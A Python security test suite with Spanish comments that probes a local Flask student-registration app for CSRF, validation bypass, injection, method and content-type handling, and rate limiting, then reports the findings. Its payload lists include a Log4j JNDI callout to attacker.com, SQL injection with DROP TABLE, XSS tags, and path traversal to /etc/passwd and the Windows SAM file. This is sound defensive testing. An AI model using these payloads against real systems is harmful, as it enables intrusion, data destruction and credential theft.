# web_form_security_tests.py - Tests específicos para formularios web del CRUD
import requests
import time
import json
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from typing import Dict, List, Any
from dataclasses import dataclass
from datetime import datetime

@dataclass
class FormSecurityTest:
    """Test específico para seguridad de formularios"""
    form_name: str
    test_name: str
    payload: Dict[str, str]
    expected_behavior: str
    actual_behavior: str = ""
    vulnerability_detected: bool = False
    severity: str = "MEDIUM"
    recommendations: List[str] = None

class WebFormSecurityTester:
    """Tester de seguridad para formularios web del sistema de estudiantes"""
    
    def __init__(self, base_url: str = "http://localhost:5000"):
        self.base_url = base_url
        self.session = requests.Session()
        self.test_results: List[FormSecurityTest] = []
        
        # Headers comunes para simular navegador real
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'es-ES,es;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
        })

    def test_registration_form_security(self):
        """Tests de seguridad específicos para el formulario de registro"""
        print("🔍 ANALIZANDO SEGURIDAD DEL FORMULARIO DE REGISTRO")
        print("-" * 50)
        
        # 1. Test de CSRF Protection
        self._test_csrf_protection()
        
        # 2. Test de validación client-side bypass
        self._test_client_side_validation_bypass()
        
        # 3. Test de inyección en campos específicos
        self._test_field_specific_injections()
        
        # 4. Test de manipulación de requests
        self._test_request_manipulation()
        
        # 5. Test de rate limiting
        self._test_registration_rate_limiting()
        
        # 6. Test de datos maliciosos
        self._test_malicious_data_handling()

    def _test_csrf_protection(self):
        """Test de protección CSRF"""
        test = FormSecurityTest(
            form_name="Registro de Estudiantes",
            test_name="Protección CSRF",
            payload={},
            expected_behavior="Request rechazado sin token CSRF válido",
            severity="HIGH"
        )
        
        try:
            # Intentar enviar datos sin obtener primero la página (sin CSRF token)
            response = self.session.post(
                urljoin(self.base_url, "/api/registrar"),
                json={
                    "nombre": "Test CSRF",
                    "apellido": "Attack",
                    "curso": "Security Test",
                    "nivel": "L1"
                }
            )
            
            if response.status_code == 200:
                test.actual_behavior = "Request aceptado sin token CSRF - VULNERABLE"
                test.vulnerability_detected = True
                test.recommendations = [
                    "Implementar tokens CSRF en todos los formularios",
                    "Validar token CSRF en el servidor",
                    "Usar SameSite cookies"
                ]
            else:
                test.actual_behavior = f"Request rechazado (Status: {response.status_code})"
                test.vulnerability_detected = False
                
        except Exception as e:
            test.actual_behavior = f"Error en conexión: {str(e)}"
            test.vulnerability_detected = False
        
        self.test_results.append(test)
        print(f"   {'❌ VULNERABLE' if test.vulnerability_detected else '✅ SEGURO'}: {test.test_name}")

    def _test_client_side_validation_bypass(self):
        """Test de bypass de validación client-side"""
        
        # Datos que deberían ser rechazados por validación client-side
        invalid_payloads = [
            {
                "nombre": "",  # Campo vacío
                "apellido": "Test",
                "curso": "Test",
                "nivel": "L1",
                "description": "Campo nombre vacío"
            },
            {
                "nombre": "Test",
                "apellido": "Test",
                "curso": "Test",
                "nivel": "L99",  # Nivel inválido
                "description": "Nivel inválido"
            },
            {
                "nombre": "A" * 500,  # Nombre muy largo
                "apellido": "Test",
                "curso": "Test",
                "nivel": "L1",
                "description": "Nombre excesivamente largo"
            }
        ]
        for payload_data in invalid_payloads:
            description = payload_data.pop("description")
            
            test = FormSecurityTest(
                form_name="Registro de Estudiantes",
                test_name=f"Bypass Validación: {description}",
                payload=payload_data,
                expected_behavior="Datos rechazados por validación server-side",
                severity="MEDIUM"
            )
            
            try:
                response = self.session.post(
                    urljoin(self.base_url, "/api/registrar"),
                    json=payload_data
                )
                
                if response.status_code == 200:
                    result = response.json()
                    if result.get('success', False):
                        test.actual_behavior = "Datos inválidos aceptados - VULNERABLE"
                        test.vulnerability_detected = True
                        test.recommendations = [
                            "Implementar validación server-side obligatoria",
                            "No confiar únicamente en validación client-side",
                            "Validar longitud y formato en el servidor"
                        ]
                    else:
                        test.actual_behavior = f"Datos rechazados correctamente: {result.get('message', '')}"
                        test.vulnerability_detected = False
                else:
                    test.actual_behavior = f"Request rechazado (Status: {response.status_code})"
                    test.vulnerability_detected = False
                    
            except Exception as e:
                test.actual_behavior = f"Error: {str(e)}"
                test.vulnerability_detected = False
            
            self.test_results.append(test)
            print(f"   {'❌ VULNERABLE' if test.vulnerability_detected else '✅ SEGURO'}: {test.test_name}")

    def _test_field_specific_injections(self):
        """Test de inyecciones específicas por campo"""
        
        injection_tests = [
            {
                "field": "nombre",
                "payloads": [
                    "<script>alert('XSS')</script>",
                    "'; DROP TABLE estudiantes; --",
                    "../../../etc/passwd",
                    "${jndi:ldap://attacker.com/a}"
                ],
                "attack_types": ["XSS", "SQL Injection", "Path Traversal", "Log4j"]
            },
            {
                "field": "curso",
                "payloads": [
                    "<img src=x onerror=alert('XSS')>",
                    "1' OR '1'='1",
                    "\\..\\..\\windows\\system32\\config\\sam"
                ],
                "attack_types": ["XSS", "SQL Injection", "Path Traversal"]
            }
        ]
        
        for field_test in injection_tests:
            field_name = field_test["field"]
            
            for payload, attack_type in zip(field_test["payloads"], field_test["attack_types"]):
                test = FormSecurityTest(
                    form_name="Registro de Estudiantes",
                    test_name=f"{attack_type} en campo {field_name}",
                    payload={
                        "nombre": payload if field_name == "nombre" else "TestNombre",
                        "apellido": "TestApellido",
                        "curso": payload if field_name == "curso" else "TestCurso",
                        "nivel": "L1"
                    },
                    expected_behavior="Payload sanitizado o rechazado",
                    severity="HIGH" if attack_type in ["SQL Injection", "XSS"] else "MEDIUM"
                )
                
                try:
                    response = self.session.post(
                        urljoin(self.base_url, "/api/registrar"),
                        json=test.payload
                    )
                    
                    if response.status_code == 200:
                        result = response.json()
                        if result.get('success', False):
                            # Verificar si el payload fue almacenado sin sanitizar
                            estudiante = result.get('estudiante', {})
                            field_value = estudiante.get(field_name, '')
                            
                            if payload in str(field_value):
                                test.actual_behavior = f"Payload {attack_type} almacenado sin sanitizar - VULNERABLE"
                                test.vulnerability_detected = True
                                test.recommendations = [
                                    f"Sanitizar entrada en campo {field_name}",
                                    "Implementar encoding de output",
                                    "Usar consultas parametrizadas",
                                    "Validar y filtrar caracteres especiales"
                                ]
                            else:
                                test.actual_behavior = f"Payload {attack_type} sanitizado correctamente"
                                test.vulnerability_detected = False
                        else:
                            test.actual_behavior = f"Payload rechazado: {result.get('message', '')}"
                            test.vulnerability_detected = False
                    else:
                        test.actual_behavior = f"Request rechazado (Status: {response.status_code})"
                        test.vulnerability_detected = False
                        
                except Exception as e:
                    test.actual_behavior = f"Error: {str(e)}"
                    test.vulnerability_detected = False
                
                self.test_results.append(test)
                print(f"   {'❌ VULNERABLE' if test.vulnerability_detected else '✅ SEGURO'}: {test.test_name}")

    def _test_request_manipulation(self):
        """Test de manipulación de requests"""
        
        # Test 1: Manipulación de Content-Type
        test = FormSecurityTest(
            form_name="Registro de Estudiantes",
            test_name="Manipulación Content-Type",
            payload={"nombre": "Test", "apellido": "Test", "curso": "Test", "nivel": "L1"},
            expected_behavior="Request rechazado con Content-Type inválido",
            severity="MEDIUM"
        )
        
        try:
            # Enviar con Content-Type manipulado
            response = self.session.post(
                urljoin(self.base_url, "/api/registrar"),
                data=json.dumps(test.payload),
                headers={'Content-Type': 'text/plain'}
            )
            
            if response.status_code == 200:
                test.actual_behavior = "Request aceptado con Content-Type inválido - VULNERABLE"
                test.vulnerability_detected = True
                test.recommendations = [
                    "Validar Content-Type en el servidor",
                    "Rechazar requests con Content-Type inesperado"
                ]
            else:
                test.actual_behavior = f"Request rechazado correctamente (Status: {response.status_code})"
                test.vulnerability_detected = False
                
        except Exception as e:
            test.actual_behavior = f"Error: {str(e)}"
            test.vulnerability_detected = False
        
        self.test_results.append(test)
        print(f"   {'❌ VULNERABLE' if test.vulnerability_detected else '✅ SEGURO'}: {test.test_name}")
        
        # Test 2: Manipulación de método HTTP
        test = FormSecurityTest(
            form_name="Registro de Estudiantes",
            test_name="HTTP Method Override",
            payload={"nombre": "Test", "apellido": "Test", "curso": "Test", "nivel": "L1"},
            expected_behavior="Solo método POST permitido",
            severity="LOW"
        )
        
        try:
            # Intentar con GET
            response = self.session.get(
                urljoin(self.base_url, "/api/registrar"),
                params=test.payload
            )
            
            if response.status_code == 200:
                test.actual_behavior = "Método GET permitido para registro - VULNERABLE"
                test.vulnerability_detected = True
                test.recommendations = [
                    "Permitir solo método POST para operaciones de escritura",
                    "Validar método HTTP en el servidor"
                ]
            else:
                test.actual_behavior = f"Método GET rechazado correctamente (Status: {response.status_code})"
                test.vulnerability_detected = False
                
        except Exception as e:
            test.actual_behavior = f"Error: {str(e)}"
            test.vulnerability_detected = False
        
        self.test_results.append(test)
        print(f"   {'❌ VULNERABLE' if test.vulnerability_detected else '✅ SEGURO'}: {test.test_name}")

    def _test_registration_rate_limiting(self):
        """Test de rate limiting en registro"""
        test = FormSecurityTest(
            form_name="Registro de Estudiantes",
            test_name="Rate Limiting",
            payload={"nombre": "RateTest", "apellido": "Test", "curso": "Test", "nivel": "L1"},
            expected_behavior="Requests limitados después de cierto número",
            severity="MEDIUM"
        )
        
        try:
            success_count = 0
            start_time = time.time()
            
            # Enviar múltiples requests rápidamente
            for i in range(15):
                response = self.session.post(
                    urljoin(self.base_url, "/api/registrar"),
                    json={
                        "nombre": f"RateTest{i}",
                        "apellido": "Test",
                        "curso": "Test",
                        "nivel": "L1"
                    }
                )
                
                if response.status_code == 200:
                    success_count += 1
                elif response.status_code == 429:  # Too Many Requests
                    break
                    
                time.sleep(0.1)  # Pequeña pausa entre requests
            
            end_time = time.time()
            
            if success_count >= 10:  # Si permite más de 10 registros seguidos
                test.actual_behavior = f"Sin rate limiting - {success_count} registros en {end_time-start_time:.2f}s - VULNERABLE"
                test.vulnerability_detected = True
                test.recommendations = [
                    "Implementar rate limiting basado en IP",
                    "Usar CAPTCHA después de varios intentos",
                    "Implementar delays progresivos"
                ]
            else:
                test.actual_behavior = f"Rate limiting activo - {success_count} registros permitidos"
                test.vulnerability_detected = False
                
        except Exception as e:
            test.actual_behavior = f"Error: {str(e)}"
            test.vulnerability_detected = False
        
        self.test_results.append(test)
        print(f"   {'❌ VULNERABLE' if test.vulnerability_detected else '✅ SEGURO'}: {test.test_name}")

    def _test_malicious_data_handling(self):
        """Test de manejo de datos maliciosos específicos"""
        
        malicious_payloads = [
            {
                "name": "Null Bytes",
                "payload": {"nombre": "Test\x00Admin", "apellido": "Test", "curso": "Test", "nivel": "L1"},
                "description": "Null byte injection"
            },
            {
                "name": "Unicode Normalization",
                "payload": {"nombre": "Tëst", "apellido": "Test", "curso": "Test", "nivel": "L1"},
                "description": "Caracteres Unicode especiales"
            },
            {
                "name": "Control Characters",
                "payload": {"nombre": "Test\r\nAdmin", "apellido": "Test", "curso": "Test", "nivel": "L1"},
                "description": "Caracteres de control CRLF"
            },
            {
                "name": "JSON Injection",
                "payload": {"nombre": '{"admin":true}', "apellido": "Test", "curso": "Test", "nivel": "L1"},
                "description": "Intento de inyección JSON"
            }
        ]
        
        for malicious_test in malicious_payloads:
            test = FormSecurityTest(
                form_name="Registro de Estudiantes",
                test_name=f"Datos Maliciosos: {malicious_test['name']}",
                payload=malicious_test["payload"],
                expected_behavior="Datos maliciosos sanitizados o rechazados",
                severity="MEDIUM"
            )
            
            try:
                response = self.session.post(
                    urljoin(self.base_url, "/api/registrar"),
                    json=test.payload
                )
                
                if response.status_code == 200:
                    result = response.json()
                    if result.get('success', False):
                        # Verificar si los datos maliciosos fueron procesados
                        estudiante = result.get('estudiante', {})
                        original_name = test.payload["nombre"]
                        stored_name = estudiante.get('nombre', '')
                        
                        if original_name == stored_name:
                            test.actual_behavior = f"Datos maliciosos almacenados sin sanitizar - VULNERABLE"
                            test.vulnerability_detected = True
                            test.recommendations = [
                                "Implementar sanitización de caracteres especiales",
                                "Validar encoding de entrada",
                                "Filtrar caracteres de control"
                            ]
                        else:
                            test.actual_behavior = f"Datos sanitizados: '{original_name}' -> '{stored_name}'"
                            test.vulnerability_detected = False
                    else:
                        test.actual_behavior = f"Datos rechazados: {result.get('message', '')}"
                        test.vulnerability_detected = False
                else:
                    test.actual_behavior = f"Request rechazado (Status: {response.status_code})"
                    test.vulnerability_detected = False
                    
            except Exception as e:
                test.actual_behavior = f"Error: {str(e)}"
                test.vulnerability_detected = False
            
            self.test_results.append(test)
            print(f"   {'❌ VULNERABLE' if test.vulnerability_detected else '✅ SEGURO'}: {test.test_name}")

    def test_consultation_endpoints(self):
        """Tests de seguridad para endpoints de consulta"""
        print("\n🔍 ANALIZANDO SEGURIDAD DE ENDPOINTS DE CONSULTA")
        print("-" * 50)
        
        # Test de SQL Injection en consultas
        injection_payloads = [
            "1' OR '1'='1",
            "'; DROP TABLE estudiantes; --",
            "1 UNION SELECT * FROM usuarios",
            "../../../etc/passwd"
        ]
        
        for payload in injection_payloads:
            test = FormSecurityTest(
                form_name="Consulta de Estudiantes",
                test_name=f"Injection en consulta: {payload[:20]}...",
                payload={"query": payload},
                expected_behavior="Payload sanitizado, consulta segura",
                severity="CRITICAL"
            )
            
            try:
                # Test en endpoint de consulta por nombre
                response = self.session.get(
                    urljoin(self.base_url, f"/api/consultar/nombre/{payload}")
                )
                
                if response.status_code == 200:
                    result = response.json()
                    if result.get('success', False):
                        estudiantes = result.get('estudiantes', [])
                        
                        # Si devuelve muchos resultados inesperados, podría ser vulnerable
                        if len(estudiantes) > 10:  # Threshold arbitrario
                            test.actual_behavior = f"Posible injection exitosa - {len(estudiantes)} resultados"
                            test.vulnerability_detected = True
                            test.recommendations = [
                                "Usar consultas parametrizadas",
                                "Validar entrada antes de consultar",
                                "Implementar whitelist de caracteres permitidos"
                            ]
                        else:
                            test.actual_behavior = f"Consulta controlada - {len(estudiantes)} resultados"
                            test.vulnerability_detected = False
                    else:
                        test.actual_behavior = f"Consulta rechazada: {result.get('message', '')}"
                        test.vulnerability_detected = False
                else:
                    test.actual_behavior = f"Request rechazado (Status: {response.status_code})"
                    test.vulnerability_detected = False
                    
            except Exception as e:
                test.actual_behavior = f"Error: {str(e)}"
                test.vulnerability_detected = False
            
            self.test_results.append(test)
            print(f"   {'❌ VULNERABLE' if test.vulnerability_detected else '✅ SEGURO'}: {test.test_name}")

    def generate_security_report(self) -> Dict[str, Any]:
        """Genera reporte completo de seguridad web"""
        vulnerabilities_found = [test for test in self.test_results if test.vulnerability_detected]
        total_tests = len(self.test_results)
        
        # Calcular puntuación
        security_score = ((total_tests - len(vulnerabilities_found)) / total_tests * 100) if total_tests > 0 else 0
        
        # Categorizar por severidad
        severity_counts = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0}
        for vuln in vulnerabilities_found:
            severity_counts[vuln.severity] += 1
        
        # Determinar nivel de riesgo
        if severity_counts["CRITICAL"] > 0:
            risk_level = "CRÍTICO"
        elif severity_counts["HIGH"] > 1:
            risk_level = "ALTO"
        elif severity_counts["MEDIUM"] > 2:
            risk_level = "MEDIO"
        else:
            risk_level = "BAJO"
        
        return {
            "timestamp": datetime.now().isoformat(),
            "total_tests": total_tests,
            "vulnerabilities_found": len(vulnerabilities_found),
            "security_score": round(security_score, 2),
            "risk_level": risk_level,
            "severity_breakdown": severity_counts,
            "test_results": [
                {
                    "form_name": test.form_name,
                    "test_name": test.test_name,
                    "vulnerability_detected": test.vulnerability_detected,
                    "severity": test.severity,
                    "actual_behavior": test.actual_behavior,
                    "recommendations": test.recommendations or []
                } for test in self.test_results
            ]
        }

    def print_detailed_report(self):
        """Imprime reporte detallado de seguridad web"""
        report = self.generate_security_report()
        
        print("\n" + "="*60)
        print("🌐 REPORTE DETALLADO DE SEGURIDAD WEB")
        print("="*60)
        print(f"🗓️  Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"🎯 Tests ejecutados: {report['total_tests']}")
        print(f"🚨 Vulnerabilidades encontradas: {report['vulnerabilities_found']}")
        print(f"📈 Puntuación de seguridad: {report['security_score']}%")
        print(f"⚠️  Nivel de riesgo: {report['risk_level']}")
        
        print(f"\n📊 Vulnerabilidades por severidad:")
        for severity, count in report['severity_breakdown'].items():
            if count > 0:
                emoji = {"CRITICAL": "🔴", "HIGH": "🟠", "MEDIUM": "🟡", "LOW": "🔵"}
                print(f"   {emoji[severity]} {severity}: {count}")
        
        # Mostrar vulnerabilidades críticas
        critical_vulns = [test for test in self.test_results 
                         if test.vulnerability_detected and test.severity in ["CRITICAL", "HIGH"]]
        
        if critical_vulns:
            print(f"\n🚨 VULNERABILIDADES CRÍTICAS/ALTAS:")
            for vuln in critical_vulns:
                print(f"\n   📍 {vuln.test_name}")
                print(f"      Comportamiento: {vuln.actual_behavior}")
                if vuln.recommendations:
                    print(f"      Recomendaciones:")
                    for rec in vuln.recommendations:
                        print(f"        • {rec}")
        
        # Resumen de recomendaciones
        all_recommendations = set()
        for test in self.test_results:
            if test.vulnerability_detected and test.recommendations:
                all_recommendations.update(test.recommendations)
        
        if all_recommendations:
            print(f"\n💡 RECOMENDACIONES GENERALES:")
            for rec in sorted(all_recommendations):
                print(f"   • {rec}")
        
        print("="*60)

def run_comprehensive_web_security_test():
    """Ejecuta test completo de seguridad web"""
    print("🚀 INICIANDO TESTS COMPRENSIVOS DE SEGURIDAD WEB")
    print("=" * 60)
    
    # Crear tester
    tester = WebFormSecurityTester()
    
    try:
        # Tests de formulario de registro
        tester.test_registration_form_security()
        
        # Tests de endpoints de consulta
        tester.test_consultation_endpoints()
        
        # Generar y mostrar reporte
        tester.print_detailed_report()
        
        # Exportar reporte
        report = tester.generate_security_report()
        filename = f"web_security_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        
        print(f"\n📄 Reporte web exportado a: {filename}")
        
        return tester, report
        
    except requests.exceptions.ConnectionError:
        print("❌ Error: No se puede conectar al servidor Flask")
        print("   Asegúrate de que la aplicación esté ejecutándose en http://localhost:5000")
        return None, None
    except Exception as e:
        print(f"❌ Error inesperado: {str(e)}")
        return None, None

if __name__ == "__main__":
    tester, report = run_comprehensive_web_security_test()
